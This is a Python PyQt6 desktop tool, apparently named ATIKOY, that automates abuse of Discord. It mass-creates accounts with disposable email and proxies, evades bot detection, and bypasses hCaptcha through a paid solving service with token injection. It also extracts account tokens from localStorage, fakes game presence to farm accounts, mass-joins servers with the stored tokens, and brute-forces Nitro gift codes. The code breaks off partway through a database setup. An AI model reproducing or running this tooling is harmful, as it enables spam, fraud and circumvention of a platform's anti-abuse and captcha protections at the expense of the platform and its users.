# Author: tdinh cute
# Decoded & Cleaned by: tdinh

import sys
import os
import re
import time
import json
import random
import string
import sqlite3
import requests
import websocket
import threading
import subprocess
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import cv2
import numpy as np

os.makedirs("images", exist_ok=True)

ADB_CMD = "adb.exe" if os.path.exists("adb.exe") else "adb"

os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = (
    "--disable-features=WebAuthentication "
    "--disable-background-timer-throttling "
    "--disable-backgrounding-occluded-windows "
    "--disable-renderer-backgrounding"
)

from PyQt6.QtCore import QThread, pyqtSignal, Qt, QUrl, QObject, QTimer
from PyQt6.QtGui import QTextCursor, QIcon
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QPushButton, QTableWidget, QTableWidgetItem, 
                             QLineEdit, QLabel, QTabWidget, QHeaderView, 
                             QSpinBox, QComboBox, QTextEdit, QPlainTextEdit, QFrame,
                             QScrollArea, QDialog, QFileDialog, QInputDialog)

from playwright.sync_api import sync_playwright

try:
    from PyQt6.QtWebEngineWidgets import QWebEngineView
    from PyQt6.QtWebEngineCore import QWebEngineProfile, QWebEnginePage, QWebEngineScript
    HAS_WEBENGINE = True
    
    class QuietWebEnginePage(QWebEnginePage):
        def javaScriptConsoleMessage(self, level, message, lineNumber, sourceID):
            pass
            
except ImportError:
    HAS_WEBENGINE = False

class StreamRedirector(QObject):
    text_written = pyqtSignal(str)

    def write(self, text):
        if text.strip():
            self.text_written.emit(text.strip())

    def flush(self):
        pass

NAMES_DB = {
    "Mỹ / Anh": {
        "first": ["Alex", "Jordan", "Taylor", "Morgan", "Casey", "Riley", "Jamie", "Charlie", "Quinn", "Avery", "Blake", "Ryan", "Emma", "Olivia", "Liam", "Noah"],
        "last": ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Rodriguez", "Wilson", "Martinez", "Anderson"]
    },
    "Việt Nam": {
        "first": ["Anh", "Nam", "Dung", "Linh", "Trang", "Huong", "Ha", "Hai", "Tuan", "Dat", "Khoa", "Thang", "Quynh", "Hoa", "Mai", "Tung"],
        "last": ["Nguyen", "Tran", "Le", "Pham", "Hoang", "Huynh", "Phan", "Vu", "Vo", "Dang", "Bui", "Do", "Ho", "Ngo"]
    },
    "Nhật Bản": {
        "first": ["Haruto", "Yuto", "Sota", "Yuki", "Hayato", "Hina", "Yui", "Sakura", "Ichika", "Akari", "Ren", "Minato"],
        "last": ["Sato", "Suzuki", "Takahashi", "Tanaka", "Watanabe", "Ito", "Yamamoto", "Nakamura", "Kobayashi", "Kato"]
    },
    "Hàn Quốc": {
        "first": ["Min-jun", "Seo-jun", "Do-yun", "Ye-jun", "Ji-ho", "Ha-yoon", "Seo-yeon", "Ha-eun", "Ji-yoo", "Ji-woo"],
        "last": ["Kim", "Lee", "Park", "Choi", "Jeong", "Kang", "Jo", "Yoon", "Jang", "Lim"]
    },
    "Trung Quốc": {
        "first": ["Wei", "Fang", "Jian", "Min", "Lei", "Na", "Qiang", "Jing", "Tao", "Hua", "Peng", "Yan", "Yong", "Li"],
        "last": ["Wang", "Li", "Zhang", "Liu", "Chen", "Yang", "Huang", "Zhao", "Wu", "Zhou"]
    }
}

HOT_GAMES = ["Liên Minh Huyền Thoại", "Valorant", "CS:GO 2", "Genshin Impact", "Minecraft", "GTA V", "Roblox", "FC Online", "PUBG", "Teamfight Tactics", "Apex Legends", "Dota 2"]
API_BASE = "https://cheapluxurymail.xyz"
MAIL_PASS = "CheapluxPass123@"
ANTICAPTCHA_API_BASE = "https://anticaptcha.top" 

class AddAccountDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Thêm Tài Khoản")
        self.setFixedSize(500, 300)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowType.WindowContextHelpButtonHint)
        self.setStyleSheet(parent.styleSheet() if parent else "")
        self.setFocusPolicy(Qt.FocusPolicy.NoFocus)

        layout = QVBoxLayout(self)
        
        self.input_field = QPlainTextEdit()
        self.input_field.setFocusPolicy(Qt.FocusPolicy.ClickFocus) 
        self.input_field.setPlaceholderText("")
        layout.addWidget(self.input_field)
        
        btn_lay = QHBoxLayout()
        self.btn_ok = QPushButton("Xác nhận")
        self.btn_ok.setFocusPolicy(Qt.FocusPolicy.NoFocus)
        self.btn_ok.clicked.connect(self.accept)
        
        self.btn_cancel = QPushButton("Hủy")
        self.btn_cancel.setFocusPolicy(Qt.FocusPolicy.NoFocus)
        self.btn_cancel.clicked.connect(self.reject)
        
        btn_lay.addWidget(self.btn_ok)
        btn_lay.addWidget(self.btn_cancel)
        layout.addLayout(btn_lay)

    def get_data(self):
        return self.input_field.toPlainText().strip()

class JoinServerDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Tham Gia Máy Chủ")
        self.setFixedSize(500, 300)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowType.WindowContextHelpButtonHint)
        self.setStyleSheet(parent.styleSheet() if parent else "")
        self.setFocusPolicy(Qt.FocusPolicy.NoFocus)

        layout = QVBoxLayout(self)
        
        self.input_field = QPlainTextEdit()
        self.input_field.setFocusPolicy(Qt.FocusPolicy.ClickFocus) 
        self.input_field.setPlaceholderText("")
        layout.addWidget(self.input_field)
        
        btn_lay = QHBoxLayout()
        self.btn_ok = QPushButton("Xác nhận Join")
        self.btn_ok.setFocusPolicy(Qt.FocusPolicy.NoFocus)
        self.btn_ok.clicked.connect(self.accept)
        
        self.btn_cancel = QPushButton("Hủy")
        self.btn_cancel.setFocusPolicy(Qt.FocusPolicy.NoFocus)
        self.btn_cancel.clicked.connect(self.reject)
        
        btn_lay.addWidget(self.btn_ok)
        btn_lay.addWidget(self.btn_cancel)
        layout.addLayout(btn_lay)

    def get_data(self):
        return self.input_field.toPlainText().strip()

class AutoRegThread(QThread):
    log_signal = pyqtSignal(str, str, bool)
    acc_created_signal = pyqtSignal(dict)
    finished_signal = pyqtSignal()

    def __init__(self, cfg):
        super().__init__()
        self.cfg = cfg
        self._is_running = True

    def stop(self):
        self._is_running = False

    def auto_solve_hcaptcha(self, page, api_key):
        if not api_key:
            self.log_signal.emit("Lỗi: Chưa cấu hình API Key Anticaptcha!", "ERROR", False)
            return False
            
        self.log_signal.emit(f"Đang bóc tách Sitekey từ trang Discord...", "INFO", False)
        
        page.wait_for_timeout(2000)
        
        try:
            sitekey = page.evaluate("""() => { 
                let sk = null;
                const el = document.querySelector('[data-sitekey]');
                if (el) sk = el.getAttribute('data-sitekey');
                if (!sk) {
                    const iframes = document.querySelectorAll('iframe');
                    for (let iframe of iframes) {
                        if (iframe.src && iframe.src.includes('hcaptcha')) {
                            const match = iframe.src.match(/sitekey=([a-zA-Z0-9-]+)/);
                            if (match) sk = match[1];
                        }
                    }
                }
                if (!sk) sk = "4c672d35-0701-42b2-88c3-78380b0db560"; 
                return sk;
            }""")
            
            if not sitekey:
                self.log_signal.emit("Lỗi: Bóc tách Sitekey thất bại hoàn toàn.", "ERROR", False)
                return False
                
            self.log_signal.emit(f"Đã tìm thấy Sitekey: {sitekey}. Đang gửi task lên hệ thống...", "INFO", False)

            api_domain = ANTICAPTCHA_API_BASE.rstrip('/')
            
            payload_create = {
                "key": api_key,
                "method": "hcaptcha",
                "sitekey": sitekey,
                "pageurl": page.url,
                "json": 1
            }
            
            res = requests.post(f"{api_domain}/in.php", data=payload_create, timeout=15)
            
            try:
                res_create = res.json()
                if res_create.get("status") != 1:
                    err_msg = res_create.get("request", "Unknown Error")
                    self.log_signal.emit(f"Lỗi API: {err_msg}", "ERROR", False)
                    return False
                task_id = res_create.get("request")
            except Exception:
                if "OK|" in res.text:
                    task_id = res.text.split("|")[1]
                else:
                    self.log_signal.emit(f"Lỗi API: {res.text}", "ERROR", False)
                    return False
                
            self.log_signal.emit(f"Đã tạo Task ID: {task_id}. Đang chờ kết quả...", "WARNING", False)

            for attempt in range(35): 
                if not self._is_running: return False
                time.sleep(5)
                
                res_check_req = requests.get(f"{api_domain}/res.php?key={api_key}&action=get&id={task_id}&json=1", timeout=15)
                
                try:
                    res_check = res_check_req.json()
                    status = res_check.get("status")
                    
                    if status == 1:
                        token = res_check.get("request")
                    elif status == 0 and res_check.get("request") == "CAPCHA_NOT_READY":
                        continue
                    else:
                        self.log_signal.emit(f"Lỗi API: {res_check.get('request', res_check_req.text)}", "ERROR", False)
                        return False
                except Exception:
                    text_resp = res_check_req.text
                    if "OK|" in text_resp:
                        token = text_resp.split("|")[1]
                    elif "CAPCHA_NOT_READY" in text_resp:
                        continue
                    else:
                        self.log_signal.emit(f"Lỗi API: {text_resp}", "ERROR", False)
                        return False
                        
                self.log_signal.emit("Nhận Token thành công! Đang thực thi vào trình duyệt...", "SUCCESS", False)
                
                page.evaluate(f"""() => {{
                    const token = "{token}";
                    const hResponse = document.querySelector('[name="h-captcha-response"]');
                    const gResponse = document.querySelector('[name="g-recaptcha-response"]');
                    if (hResponse) hResponse.innerHTML = token;
                    if (gResponse) gResponse.innerHTML = token;
                    
                    if(typeof hcaptcha !== 'undefined' && hcaptcha.getResponse) {{
                        hcaptcha.getResponse = () => token;
                    }}
                }}""")
                
                page.wait_for_timeout(1000)
                try:
                    btn = page.query_selector('button[type="submit"]')
                    if btn and btn.is_visible():
                        btn.click(force=True)
                except: pass
                
                return True
                    
            self.log_signal.emit("Timeout: Chờ giải Captcha quá thời gian quy định.", "ERROR", False)
            return False
            
        except requests.exceptions.RequestException as req_e:
            self.log_signal.emit("Lỗi mạng: Không thể kết nối tới server Anticaptcha.", "ERROR", False)
            return False
        except Exception as e:
            self.log_signal.emit(f"Ngoại lệ hàm auto_solve_hcaptcha: {str(e)}", "ERROR", False)
            return False

    def check_captcha_template(self, image_bytes, template_path, threshold=0.8):
        if not os.path.exists(template_path):
            return False
        try:
            nparr = np.frombuffer(image_bytes, np.uint8)
            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            template = cv2.imread(template_path)
            
            if img is None or template is None:
                return False
                
            img_gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            template_gray = cv2.cvtColor(template, cv2.COLOR_BGR2GRAY)
            res = cv2.matchTemplate(img_gray, template_gray, cv2.TM_CCOEFF_NORMED)
            loc = np.where(res >= threshold)
            
            if len(loc[0]) > 0:
                return True
            return False
        except Exception as e:
            return False

    def run(self):
        proxies_list = self.cfg.get('proxies', [])
        api_keys_list = self.cfg.get('anticaptcha_keys', [])
        captcha_mode = self.cfg.get('captcha_mode', 0)

        for i in range(self.cfg['count']):
            if not self._is_running:
                break

            if i > 0 and self.cfg['delay'] > 0:
                self.log_signal.emit(f"Đang chờ {self.cfg['delay']} giây trước khi tạo luồng mới...", "INFO", False)
                for d in range(self.cfg['delay'], 0, -1):
                    if not self._is_running: break
                    time.sleep(1)
            
            if not self._is_running: break
            self.log_signal.emit(f"Bắt đầu khởi tạo luồng cho tài khoản {i+1}...", "INFO", False)

            country_db = NAMES_DB.get(self.cfg['country'], NAMES_DB["Mỹ / Anh"])
            display_name = f"{random.choice(country_db['first'])} {random.choice(country_db['last'])}"
            raw_name = re.sub(r'[^a-zA-Z0-9]', '', display_name).lower()
            password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12)) + "A1@!" if self.cfg['pass_mode'] == 'random' else self.cfg['custom_pass']

            proxy_settings = None
            if self.cfg['use_proxy'] and proxies_list:
                proxy_str = random.choice(proxies_list)
                self.log_signal.emit(f"Thiết lập Proxy: {proxy_str}", "INFO", False)
                parts = proxy_str.split(':')
                if len(parts) == 2:
                    proxy_settings = {"server": f"http://{parts[0]}:{parts[1]}"}
                elif len(parts) == 4:
                    proxy_settings = {
                        "server": f"http://{parts[0]}:{parts[1]}",
                        "username": parts[2],
                        "password": parts[3]
                    }
                else:
                    proxy_settings = {"server": f"http://{proxy_str}"}

            try:
                domains = ["cheapluxury.eu"]
                for _ in range(3):
                    try:
                        res_dom = requests.get(f"{API_BASE}/domains", timeout=30).json()
                        domains = res_dom.get('data', {}).get('domains', ["cheapluxury.eu"])
                        if domains: break
                    except Exception:
                        time.sleep(2)
                
                clean_prefix = re.sub(r'[^a-zA-Z0-9]', '', self.cfg['prefix']).lower()
                username = f"{clean_prefix}{raw_name}{random.randint(100, 9999)}"
                
                email_registered = False
                email = ""
                
                for attempt in range(5):
                    if not self._is_running: break
                    email = f"{username}@{random.choice(domains)}"
                    try:
                        res_reg = requests.post(f"{API_BASE}/register", json={"email": email, "password": MAIL_PASS}, timeout=30).json()
                        
                        if res_reg.get('response_code') in [200, 201]:
                            email_registered = True
                            break
                        
                        self.log_signal.emit(f"Email {email} không hợp lệ, đang thử lại lần {attempt+2}...", "WARNING", False)
                    except Exception as req_e:
                        self.log_signal.emit(f"API Mail phản hồi chậm, đang thử lại lần {attempt+2}...", "WARNING", False)
                        
                    username = f"{clean_prefix}{raw_name}{random.randint(1000, 99999)}"
                    time.sleep(2)

                if not email_registered or not self._is_running:
                    self.log_signal.emit("Bỏ qua tài khoản này do không thể kết nối tới máy chủ API Mail.", "ERROR", False)
                    continue
                    
                self.log_signal.emit(f"Mail API đã được cấp phát: {email}", "SUCCESS", False)
            except Exception as e:
                self.log_signal.emit(f"Ngoại lệ kết nối API Mail: {str(e)}", "ERROR", False)
                continue

            try:
                with sync_playwright() as p:
                    if not self._is_running: break
                    
                    platform_mode = self.cfg.get('platform', 0)
                    
                    if platform_mode == 1:
                        self.log_signal.emit("Đang kết nối tới LDPlayer qua ADB...", "INFO", False)
                        subprocess.run([ADB_CMD, "connect", "127.0.0.1:5555"], capture_output=True, timeout=3)
                        
                        self.log_signal.emit("Xóa sạch dữ liệu Chrome cũ...", "INFO", False)
                        subprocess.run([ADB_CMD, "shell", "pm", "clear", "com.android.chrome"], capture_output=True)
                        subprocess.run([ADB_CMD, "shell", "echo 'chrome --disable-fre --no-default-browser-check --no-first-run' > /data/local/tmp/chrome-command-line"], capture_output=True)
                        
                        if proxy_settings:
                            proxy_server = proxy_settings.get("server", "").replace("http://", "")
                            subprocess.run([ADB_CMD, "shell", "settings", "put", "global", "http_proxy", proxy_server], capture_output=True)
                        else:
                            subprocess.run([ADB_CMD, "shell", "settings", "put", "global", "http_proxy", ":0"], capture_output=True)
                        
                        self.log_signal.emit("Mở App Chrome trên LDPlayer...", "INFO", False)
                        subprocess.run([ADB_CMD, "shell", "am", "start", "-n", "com.android.chrome/com.google.android.apps.chrome.Main", "-d", "about:blank"], capture_output=True)
                        time.sleep(4) 
                        
                        out = subprocess.run([ADB_CMD, "shell", "cat", "/proc/net/unix"], capture_output=True, text=True)
                        match = re.search(r'@(chrome_devtools_remote_?\d*)', out.stdout)
                        socket_name = match.group(1) if match else "chrome_devtools_remote"
                        
                        self.log_signal.emit(f"Đã tìm thấy DevTools Socket: {socket_name}", "INFO", False)
                        
                        subprocess.run([ADB_CMD, "forward", "--remove", "tcp:9222"], capture_output=True)
                        subprocess.run([ADB_CMD, "forward", "tcp:9222", f"localabstract:{socket_name}"], capture_output=True)
                        time.sleep(1.5)
                        
                        try:
                            browser = p.chromium.connect_over_cdp("http://127.0.0.1:9222")
                            context = browser.contexts[0]
                            page = context.pages[0] if context.pages else context.new_page()
                        except Exception as e:
                            self.log_signal.emit("Lỗi: Không thể kết nối tới Chrome. Đang thử đóng lại ứng dụng...", "ERROR", False)
                            subprocess.run([ADB_CMD, "shell", "am", "force-stop", "com.android.chrome"], capture_output=True)
                            continue
                            
                        page.add_init_script("""
                            window.PublicKeyCredential = undefined;
                            if (window.navigator && window.navigator.credentials) {
                                window.navigator.credentials.get = function() { return new Promise(() => {}); };
                                window.navigator.credentials.create = function() { return new Promise(() => {}); };
                                window.navigator.credentials.getClientCapabilities = function() { return Promise.resolve({}); };
                            }
                        """)

                    else:
                        launch_args = {
                            "headless": False,
                            "args": [
                                "--disable-blink-features=AutomationControlled",
                                "--disable-features=WebAuthentication" 
                            ]
                        }
                        if proxy_settings:
                            launch_args["proxy"] = proxy_settings

                        self.log_signal.emit("Mở trình duyệt Chromium ẩn danh...", "INFO", False)
                        
                        browser = p.chromium.launch(**launch_args)
                        context = browser.new_context()
                        
                        context.add_init_script("""
                            window.PublicKeyCredential = undefined;
                            if (window.navigator && window.navigator.credentials) {
                                window.navigator.credentials.get = function() { return new Promise(() => {}); };
                                window.navigator.credentials.create = function() { return new Promise(() => {}); };
                                window.navigator.credentials.getClientCapabilities = function() { return Promise.resolve({}); };
                            }
                        """)
                        page = context.new_page()
                    
                    self.log_signal.emit("Tự động truy cập liên kết và điền form...", "INFO", False)
                    page.goto("https://discord.com/register?locale=en-US")
                    page.wait_for_timeout(2500)

                    if not self._is_running:
                        try: browser.close()
                        except: pass
                        break

                    page.fill('input[name="email"]', email)
                    if page.query_selector('input[name="global_name"]'):
                        page.fill('input[name="global_name"]', display_name)
                    page.fill('input[name="username"]', username)
                    page.fill('input[name="password"]', password)

                    day = str(random.randint(1, 28))
                    months_en = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
                    month = random.choice(months_en)
                    year = str(random.randint(1990, 2005))
                    
                    self.fill_discord_dropdown(page, 'div[class*="month"], div[aria-label="Month"], input[aria-label="Month"]', month)
                    self.fill_discord_dropdown(page, 'div[class*="day"], div[aria-label="Day"], input[aria-label="Day"]', day)
                    self.fill_discord_dropdown(page, 'div[class*="year"], div[aria-label="Year"], input[aria-label="Year"]', year)

                    page.wait_for_timeout(500)
                    page.click('button[type="submit"]')
                    self.log_signal.emit("Đã submit form đăng ký. Đang chờ hệ thống phản hồi...", "INFO", False)

                    captcha_path = "images/captcha.png"
                    limited_path = "images/limited.png"
                    error_email_path = "images/erroremail.png"
                    
                    account_aborted = False
                    captcha_logged = False
                    
                    start_wait = time.time()
                    while time.time() - start_wait < 25:
                        if not self._is_running: break
                        
                        try:
                            image_bytes = page.screenshot()
                        except:
                            break 
                            
                        if os.path.exists(limited_path) and self.check_captcha_template(image_bytes, limited_path, threshold=0.8):
                            self.log_signal.emit("Lỗi: Phát hiện IP bị giới hạn. Đóng luồng này...", "ERROR", False)
                            account_aborted = True
                            break
                            
                        if os.path.exists(error_email_path) and self.check_captcha_template(image_bytes, error_email_path, threshold=0.8):
                            self.log_signal.emit("Lỗi: Phát hiện Email không hợp lệ. Đóng luồng này...", "ERROR", False)
                            account_aborted = True
                            break
                            
                        try:
                            has_captcha_dom = page.evaluate("() => !!document.querySelector('[data-sitekey]') || !!document.querySelector('iframe[src*=\"hcaptcha\"]')")
                        except:
                            has_captcha_dom = False
                            
                        has_captcha_img = os.path.exists(captcha_path) and self.check_captcha_template(image_bytes, captcha_path, threshold=0.8)
                        
                        if has_captcha_dom or has_captcha_img:
                            if captcha_mode == 0: 
                                self.log_signal.emit("Phát hiện Captcha! Khởi động tiến trình tự động giải...", "WARNING", False)
                                
                                current_api_key = random.choice(api_keys_list) if api_keys_list else ""
                                is_solved = self.auto_solve_hcaptcha(page, current_api_key)
                                
                                if is_solved:
                                    self.log_signal.emit("Đã ép Token Captcha thành công! Chờ 5s để hệ thống xác nhận...", "SUCCESS", False)
                                    page.wait_for_timeout(5000)
                                    break 
                                else:
                                    self.log_signal.emit("Thất bại trong việc giải Captcha. Hủy tài khoản này.", "ERROR", False)
                                    account_aborted = True
                                    break
                            else: 
                                if not captcha_logged:
                                    self.log_signal.emit("Phát hiện Captcha! Vui lòng giải tay trên trình duyệt...", "WARNING", False)
                                    captcha_logged = True
                                
                                start_wait = time.time()
                                time.sleep(2)
                                continue 
                        else:
                            if captcha_logged:
                                self.log_signal.emit("Ảnh sạch / Đã qua Captcha. Tiếp tục...", "SUCCESS", False)
                                break 
                                
                        time.sleep(1.5) 
                        
                    if account_aborted or not self._is_running:
                        try: browser.close()
                        except: pass
                        
                        if platform_mode == 1:
                            self.log_signal.emit("Dọn dẹp: Đang xóa dữ liệu App Chrome trên LDPlayer...", "WARNING", False)
                            subprocess.run([ADB_CMD, "shell", "pm", "clear", "com.android.chrome"], capture_output=True)
                            subprocess.run([ADB_CMD, "shell", "settings", "put", "global", "http_proxy", ":0"], capture_output=True)
                        continue

                    self.log_signal.emit(f"Đang đợi Email verify gửi về server API...", "INFO", False)

                    verify_link = None
                    for attempt in range(40):
                        if not self._is_running: break
                        time.sleep(5)
                        try:
                            chk = requests.post(f"{API_BASE}/email/get", json={"email": email, "password": MAIL_PASS}, timeout=20).json()
                            if chk.get('response_code') == 200:
                                emails = chk.get('data', {}).get('emails', [])
                                for m in emails:
                                    body = (m.get('body_html','') + m.get('body_text',''))
                                    links = re.findall(r'https?://[^\s"\'<>]+', body)
                                    disc_links = [l.replace('&amp;', '&') for l in links if ('discord.com' in l or 'click.discord.com' in l) and 'support.' not in l]
                                    if disc_links:
                                        verify_link = max(disc_links, key=len)
                                        break
                        except Exception: 
                            pass 
                        if verify_link: break

                    if verify_link and self._is_running:
                        self.log_signal.emit(f"Nhận link xác thực! Đang xử lý tự động...", "INFO", False)
                        page.goto(verify_link)
                        page.wait_for_timeout(5000)

                        token = page.evaluate("""() => {
                            try {
                                const iframe = document.createElement('iframe');
                                document.head.append(iframe);
                                const t = iframe.contentWindow.localStorage.token || localStorage.token;
                                iframe.remove();
                                return t ? t.replace(/"/g, '') : null;
                            } catch(e) { return localStorage.token ? localStorage.token.replace(/"/g, '') : null; }
                        }""")

                        if token and self._is_running:
                            self.log_signal.emit(f"Xác thực Email thành công. Đã trích xuất được TOKEN!", "SUCCESS", False)
                            self.acc_created_signal.emit({
                                "token": token, "email": email, "username": username,
                                "password": password
                            })
                        else:
                            self.log_signal.emit(f"Lỗi: Không thể trích xuất Token thông qua LocalStorage.", "ERROR", False)
                    else:
                        if self._is_running:
                            self.log_signal.emit(f"Timeout: Không nhận được Email verify từ server.", "ERROR", False)
                        
                    try: browser.close()
                    except: pass
                    
                    if platform_mode == 1:
                        self.log_signal.emit("Xóa Dữ Liệu App Chrome trên LDPlayer sau khi hoàn thành...", "INFO", False)
                        subprocess.run([ADB_CMD, "shell", "pm", "clear", "com.android.chrome"], capture_output=True)
                        subprocess.run([ADB_CMD, "shell", "settings", "put", "global", "http_proxy", ":0"], capture_output=True)
                        
                    time.sleep(2)
            except Exception as e:
                if self._is_running:
                    self.log_signal.emit(f"Lỗi khởi tạo / vận hành Browser: {str(e)}", "ERROR", False)
                pass

        self.finished_signal.emit()

    def fill_discord_dropdown(self, page, selector, val):
        try:
            el = page.query_selector(selector)
            if el:
                el.click(force=True)
                page.wait_for_timeout(300)
                page.keyboard.type(val, delay=100)
                page.wait_for_timeout(300)
                page.keyboard.press("Enter")
                page.wait_for_timeout(200)
        except Exception:
            pass

class TokenCheckerThread(QThread):
    progress_signal = pyqtSignal(str, bool, dict)
    finished_signal = pyqtSignal()

    def __init__(self, tokens):
        super().__init__()
        self.tokens = tokens

    def run(self):
        for token in self.tokens:
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            try:
                res = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                if res.status_code == 200:
                    data = res.json()
                    is_live = True
                    
                    res2 = requests.get('https://discord.com/api/v9/users/@me/library', headers=headers, timeout=5)
                    if res2.status_code in [401, 403]:
                        is_live = False
                    else:
                        try:
                            js_data = res2.json()
                            if isinstance(js_data, dict) and js_data.get('code') in [40002, 40003]:
                                is_live = False
                        except:
                            pass
                            
                    self.progress_signal.emit(token, is_live, data if is_live else {})
                else:
                    self.progress_signal.emit(token, False, {})
            except:
                self.progress_signal.emit(token, False, {})
            time.sleep(1)
        self.finished_signal.emit()

class DiscordFarmerThread(QThread):
    def __init__(self, token, game_name):
        super().__init__()
        self.token = token
        self.game_name = game_name
        self.running = True
        self.ws = None
        self.seq = None
        self.heartbeat_active = False

    def run(self):
        while self.running:
            try:
                self.ws = websocket.WebSocket()
                self.ws.connect("wss://gateway.discord.gg/?v=10&encoding=json")
                
                self.heartbeat_active = True
                self.seq = None

                hello_msg = json.loads(self.ws.recv())
                if hello_msg.get('op') == 10:
                    interval = hello_msg['d']['heartbeat_interval'] / 1000.0
                    threading.Thread(target=self.heartbeat, args=(interval,), daemon=True).start()

                self.ws.send(json.dumps({
                    "op": 2,
                    "d": {
                        "token": self.token,
                        "properties": {
                            "os": "Windows", 
                            "browser": "Discord Client", 
                            "device": "desktop"
                        },
                        "presence": {
                            "status": "online",
                            "since": 0,
                            "activities": [{"name": self.game_name, "type": 0}],
                            "afk": False
                        },
                        "compress": False, 
                        "intents": 0
                    }
                }))

                while self.running and self.ws.connected:
                    msg = json.loads(self.ws.recv())
                    
                    if msg.get('s') is not None:
                        self.seq = msg['s']
                        
                    op = msg.get('op')
                    if op == 9:  
                        time.sleep(random.uniform(2, 5))
                        break
                    elif op == 7:  
                        break

            except Exception:
                self.heartbeat_active = False
                if self.ws:
                    try: self.ws.close()
                    except: pass
                if self.running:
                    time.sleep(5)

    def heartbeat(self, interval):
        time.sleep(interval * random.random())
        
        while self.running and self.heartbeat_active and self.ws and self.ws.connected:
            try:
                self.ws.send(json.dumps({"op": 1, "d": self.seq}))
                time.sleep(interval)
            except:
                break
        self.heartbeat_active = False

    def stop(self):
        self.running = False
        self.heartbeat_active = False
        if self.ws: 
            try:
                self.ws.close()
            except:
                pass

class JoinServerThread(QThread):
    log_signal = pyqtSignal(str, str, bool)
    finished_signal = pyqtSignal()

    def __init__(self, tokens, invites):
        super().__init__()
        self.tokens = tokens
        self.invites = invites

    def join_server_single(self, token, invite, idx):
        invite_code = invite.split("/")[-1].strip()
        try:
            r = requests.post(
                f"https://discord.com/api/v9/invites/{invite_code}",
                headers={"Authorization": token},
                timeout=10
            )
            if r.status_code == 200:
                return idx, "Thành công", None
            elif r.status_code == 429:
                return idx, "Rate limit", r.status_code
            elif r.status_code == 403:
                return idx, "Token hết hạn hoặc bị khóa", r.status_code
            else:
                return idx, f"Thất bại ({r.status_code})", r.status_code
        except Exception as e:
            return idx, f"Lỗi: {str(e)[:30]}", None

    def run(self):
        for invite in self.invites:
            invite_code = invite.split("/")[-1].strip()
            self.log_signal.emit(f"Đang join {len(self.tokens)} tài khoản vào server '{invite_code}'...", "INFO", False)
            
            results = []
            max_workers = min(3, len(self.tokens)) 
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(self.join_server_single, token, invite, i): i 
                           for i, token in enumerate(self.tokens, 1)}
                
                for future in as_completed(futures):
                    idx, status, code = future.result()
                    
                    if "Thành công" in status:
                        self.log_signal.emit(f"Acc {idx:>2}: {status}", "SUCCESS", False)
                    elif "Rate limit" in status:
                        self.log_signal.emit(f"Acc {idx:>2}: {status}", "WARNING", False)
                    else:
                        self.log_signal.emit(f"Acc {idx:>2}: {status}", "ERROR", False)
                        
                    results.append((idx, status))
                    
                    if code == 429:
                        self.log_signal.emit(f"Chờ 5 giây do rate limit...", "WARNING", False)
                        time.sleep(5)
                        
            success = sum(1 for _, s in results if "Thành công" in s)
            failed = len(results) - success
            self.log_signal.emit(f"Kết quả join '{invite_code}': {success} thành công | {failed} thất bại", "INFO", False)
            time.sleep(2) 
            
        self.log_signal.emit("Hoàn tất tiến trình tham gia máy chủ hàng loạt!", "SUCCESS", False)
        self.finished_signal.emit()

class NitroGenThread(QThread):
    log_signal = pyqtSignal(str, str, bool)
    found_nitro = pyqtSignal(str)
    finished_signal = pyqtSignal()

    def __init__(self, count):
        super().__init__()
        self.count = count
        self._is_running = True

    def stop(self):
        self._is_running = False

    def run(self):
        for i in range(self.count):
            if not self._is_running: break
            code_nitro = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
            url_nitro = f'https://discord.gift/{code_nitro}'
            try:
                res = requests.get(f'https://discord.com/api/v9/entitlements/gift-codes/{code_nitro}?with_application=false&with_subscription_plan=true', timeout=5)
                if res.status_code == 200:
                    self.log_signal.emit(f"Hợp lệ | Nitro: {url_nitro}", "SUCCESS", False)
                    self.found_nitro.emit(url_nitro)
                elif res.status_code == 429:
                    self.log_signal.emit(f"Rate limited (429) khi quét Nitro. Chờ 5s...", "WARNING", False)
                    time.sleep(5)
                else:
                    self.log_signal.emit(f"Không hợp lệ | Nitro: {url_nitro}", "ERROR", False)
            except requests.exceptions.RequestException as e:
                self.log_signal.emit(f"Lỗi mạng kiểm tra Nitro: {str(e)}", "ERROR", False)
            
            time.sleep(1) 
        self.finished_signal.emit()

class AtikoyApp(QMainWindow):
    def __init__(self):
        super().__init__()
        
        self.sys_redirector = StreamRedirector()
        self.sys_redirector.text_written.connect(self.sys_log)
        sys.stdout = self.sys_redirector
        sys.stderr = self.sys_redirector

        self.setWindowTitle("ATIKOY - QUẢN LÝ TÀI KHOẢN DISCORD")
        
        icon_path = "logo.jpg"
        if os.path.exists(icon_path):
            self.setWindowIcon(QIcon(icon_path))
            
        self.setGeometry(100, 100, 1400, 850)
        self.apply_professional_theme()
        
        self.account_list = []
        self.farmer_threads = []
        self.current_auto_farm = False
        self.reg_thread = None
        
        self.auto_check_timer = QTimer(self)
        self.auto_check_timer.timeout.connect(self.safe_check_all_tokens)
        
        self.init_ui()
        self.log("Khởi động ứng dụng ATIKOY thành công...", "INFO")
        
        self.setup_db()
        self.load_accounts_from_db()

    def sys_log(self, text):
        safe_text = text.replace('<', '&lt;').replace('>', '&gt;')
        self.log(f"[System] {safe_text}", "WARNING")

    def setup_db(self):
        self.db_conn = sqlite3.connect("atikoy.db", check_same_thread=False)
        cursor = self.db_conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS accounts_v2 (
                email TEXT,
                username TEXT,
                password TEXT,
                token TEXT UNIQUE,
                song_chet TEXT,
